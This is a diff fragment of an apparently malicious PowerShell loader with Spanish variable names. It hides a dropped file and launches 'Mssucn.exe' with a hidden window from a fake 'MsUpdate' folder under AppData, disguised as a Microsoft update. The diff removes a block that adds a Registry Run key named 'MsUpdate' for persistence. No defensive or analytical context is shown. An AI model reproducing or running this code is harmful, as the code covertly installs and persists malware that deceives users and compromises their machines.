@@ -34,14 +34,6 @@ $atributosOcultosRuner = (Get-Item $rutaLocalRuner).Attributes -bor [System.IO.F
 Set-ItemProperty -Path $rutaLocalRuner -Name Attributes -Value $atributosOcultosRuner
 sleep 10
 
-# Registry path for the startup entries
-$rutaRegistro = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$nombreEntrada = "MsUpdate"
-if (-not (Test-Path "$rutaRegistro\$nombreEntrada")) {
-    $valorEntrada = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\Mssucn.exe"
-    $null = New-ItemProperty -Path $rutaRegistro -Name $nombreEntrada -Value $valorEntrada -PropertyType String -Force
-}
-sleep 10
 
 ## Execution of the client
 Start-Process -FilePath "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\Mssucn.exe" -WindowStyle Hidden
